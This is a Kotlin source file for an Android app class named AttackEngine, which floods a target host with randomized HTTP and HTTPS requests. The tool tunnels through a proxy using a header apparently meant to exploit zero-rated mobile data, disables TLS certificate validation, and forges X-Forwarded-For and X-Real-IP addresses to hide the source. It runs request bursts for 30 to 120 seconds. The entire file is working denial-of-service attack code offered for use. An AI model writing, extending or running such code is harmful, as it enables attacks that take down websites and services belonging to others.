package com.alrufaaey.batapp

import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import kotlin.random.Random

class AttackEngine(
    private val host: String,
    private val isHttps: Boolean,
    private val onRequestSent: (Long) -> Unit,
    private val onLog: (String) -> Unit
) {
    val running = AtomicBoolean(true)
    private val requestCounter = AtomicLong(0)

    private val chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    private val specialChars = "@#\$%&*-_+="

    private fun buildBlock(size: Int): String {
        val sb = StringBuilder(size)
        repeat(size) {
            val choice = Random.nextInt(1, 4)
            when (choice) {
                1 -> sb.append(('A'..'Z').random())
                2 -> sb.append(('a'..'z').random())
                else -> sb.append(('0'..'9').random())
            }
        }
        repeat(size / 10) {
            val pos = Random.nextInt(sb.length)
            sb[pos] = specialChars.random()
        }
        return sb.toString()
    }

    private fun generateRandomIp(): String {
        val firstOctets = listOf(1, 2, 3, 4, 5, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 110, 120, 130, 140, 150, 160, 170, 180, 190, 200)
        return "${firstOctets.random()}.${Random.nextInt(1, 256)}.${Random.nextInt(1, 256)}.${Random.nextInt(1, 256)}"
    }

    private fun createSecureConnect(targetHost: String): String {
        return buildString {
            append("CONNECT $targetHost:443 HTTP/1.1\r\n")
            append("Host: $targetHost:443\r\n")
            append("x-iorg-bsid: @alrufaaey\r\n")
            append("User-Agent: ${AttackConfig.USER_AGENT}\r\n")
            append("Proxy-Connection: keep-alive\r\n")
            append("Connection: keep-alive\r\n")
            append("X-Forwarded-For: ${generateRandomIp()}\r\n")
            append("X-Real-IP: ${generateRandomIp()}\r\n")
            append("Accept: */*\r\n")
            append("Accept-Encoding: gzip, deflate, br\r\n")
            append("Accept-Language: en-US,en;q=0.9,ar;q=0.8\r\n")
            append("Cache-Control: no-cache\r\n")
            append("Pragma: no-cache\r\n")
            append("\r\n")
        }
    }

    private fun createTurboConnection(): Socket? {
        return try {
            val sock = Socket()
            sock.soTimeout = 15000
            sock.setOption(java.net.StandardSocketOptions.SO_KEEPALIVE, true)
            sock.setOption(java.net.StandardSocketOptions.TCP_NODELAY, true)
            sock.setOption(java.net.StandardSocketOptions.SO_REUSEADDR, true)
            repeat(3) { attempt ->
                try {
                    sock.connect(InetSocketAddress(AttackConfig.PROXY_HOST, AttackConfig.PROXY_PORT), 15000)
                    return sock
                } catch (e: Exception) {
                    if (attempt < 2) Thread.sleep(50)
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun getTrustAllSslContext(): SSLContext {
        val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        val sslContext = SSLContext.getInstance("TLS")
        sslContext.init(null, trustAllCerts, SecureRandom())
        return sslContext
    }

    fun runHttpsAttack() {
        var sock: Socket? = null
        try {
            sock = createTurboConnection() ?: return
            val connectRequest = createSecureConnect(host)
            sock.getOutputStream().write(connectRequest.toByteArray())
            sock.getOutputStream().flush()

            sock.soTimeout = 5000
            val response = StringBuilder()
            val startTime = System.currentTimeMillis()
            try {
                val buffer = ByteArray(1024)
                while (System.currentTimeMillis() - startTime < 3000) {
                    val read = sock.getInputStream().read(buffer)
                    if (read == -1) break
                    response.append(String(buffer, 0, read))
                    if (response.contains("200") || response.contains("\r\n\r\n")) break
                }
            } catch (e: Exception) { /* timeout */ }

            if (!response.contains("200")) return

            val sslContext = getTrustAllSslContext()
            val sslFactory = sslContext.socketFactory
            val sslSock = sslFactory.createSocket(sock, host, 443, true)
            sslSock.soTimeout = 10000

            val attackDuration = (30000 + Random.nextLong(90000)).toLong()
            val startAttack = System.currentTimeMillis()

            while (running.get() && System.currentTimeMillis() - startAttack < attackDuration) {
                try {
                    val requestType = listOf("GET", "POST", "HEAD", "PUT", "DELETE").random()
                    val out: OutputStream = sslSock.getOutputStream()

                    when (requestType) {
                        "GET" -> {
                            repeat(Random.nextInt(5, 21)) {
                                val path = "/" + buildBlock(Random.nextInt(3, 16))
                                val params = buildString {
                                    append("?")
                                    repeat(Random.nextInt(1, 9)) { i ->
                                        if (i > 0) append("&")
                                        append("${buildBlock(Random.nextInt(3, 11))}=${buildBlock(Random.nextInt(10, 101))}")
                                    }
                                }
                                val request = buildString {
                                    append("GET $path$params HTTP/1.1\r\n")
                                    append("Host: $host\r\n")
                                    append("User-Agent: ${AttackConfig.USER_AGENT}\r\n")
                                    append("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n")
                                    append("Accept-Language: en-US,en;q=0.5\r\n")
                                    append("Accept-Encoding: gzip, deflate, br\r\n")
                                    append("X-Forwarded-For: ${generateRandomIp()}\r\n")
                                    append("Connection: keep-alive\r\n")
                                    append("Upgrade-Insecure-Requests: 1\r\n")
                                    append("Cache-Control: max-age=0\r\n")
                                    append("\r\n")
                                }
                                out.write(request.toByteArray())
                                out.flush()
                                val count = requestCounter.incrementAndGet()
                                onRequestSent(count)
                                Thread.sleep(Random.nextLong(1, 10))
                            }
                        }
                        "POST" -> {
                            repeat(Random.nextInt(3, 11)) {
                                val bodySize = Random.nextInt(500, 5001)
                                val body = buildBlock(bodySize)
                                val request = buildString {
                                    append("POST /${buildBlock(Random.nextInt(3, 16))} HTTP/1.1\r\n")
                                    append("Host: $host\r\n")
                                    append("User-Agent: ${AttackConfig.USER_AGENT}\r\n")
                                    append("Content-Type: application/x-www-form-urlencoded\r\n")
                                    append("Content-Length: ${body.length}\r\n")
                                    append("X-Forwarded-For: ${generateRandomIp()}\r\n")
                                    append("Connection: keep-alive\r\n")
                                    append("\r\n")
                                    append(body)
                                }
                                out.write(request.toByteArray())
                                out.flush()
                                val count = requestCounter.incrementAndGet()
                                onRequestSent(count)
                                Thread.sleep(Random.nextLong(1, 10))
                            }
                        }
                        else -> {
                            val request = buildString {
                                append("$requestType /${buildBlock(Random.nextInt(3, 16))} HTTP/1.1\r\n")
                                append("Host: $host\r\n")
                                append("User-Agent: ${AttackConfig.USER_AGENT}\r\n")
                                append("X-Forwarded-For: ${generateRandomIp()}\r\n")
                                append("Connection: keep-alive\r\n")
                                append("\r\n")
                            }
                            out.write(request.toByteArray())
                            out.flush()
                            val count = requestCounter.incrementAndGet()
                            onRequestSent(count)
                            Thread.sleep(Random.nextLong(1, 10))
                        }
                    }
                } catch (e: Exception) {
                    break
                }
            }
            sslSock.close()
        } catch (e: Exception) {
            onLog("خطأ في الاتصال: ${e.message}")
        } finally {
            try { sock?.close() } catch (e: Exception) {}
        }
    }

    fun runHttpAttack() {
        var sock: Socket? = null
        try {
            sock = Socket()
            sock.soTimeout = 15000
            sock.connect(InetSocketAddress(host, 80), 15000)

            val attackDuration = (30000 + Random.nextLong(90000)).toLong()
            val startAttack = System.currentTimeMillis()

            while (running.get() && System.currentTimeMillis() - startAttack < attackDuration) {
                try {
                    val out = sock.getOutputStream()
                    val path = "/" + buildBlock(Random.nextInt(3, 16))
                    val params = buildString {
                        append("?")
                        repeat(Random.nextInt(1, 9)) { i ->
                            if (i > 0) append("&")
                            append("${buildBlock(Random.nextInt(3, 11))}=${buildBlock(Random.nextInt(10, 101))}")
                        }
                    }
                    val request = buildString {
                        append("GET $path$params HTTP/1.1\r\n")
                        append("Host: $host\r\n")
                        append("User-Agent: ${AttackConfig.USER_AGENT}\r\n")
                        append("Accept: */*\r\n")
                        append("X-Forwarded-For: ${generateRandomIp()}\r\n")
                        append("Connection: keep-alive\r\n")
                        append("\r\n")
                    }
                    out.write(request.toByteArray())
                    out.flush()
                    val count = requestCounter.incrementAndGet()
                    onRequestSent(count)
                    Thread.sleep(Random.nextLong(1, 10))
                } catch (e: Exception) {
                    break
                }
            }
        } catch (e: Exception) {
            onLog("خطأ HTTP: ${e.message}")
        } finally {
            try { sock?.close() } catch (e: Exception) {}
        }
    }

    fun stop() {
        running.set(false)
    }
}
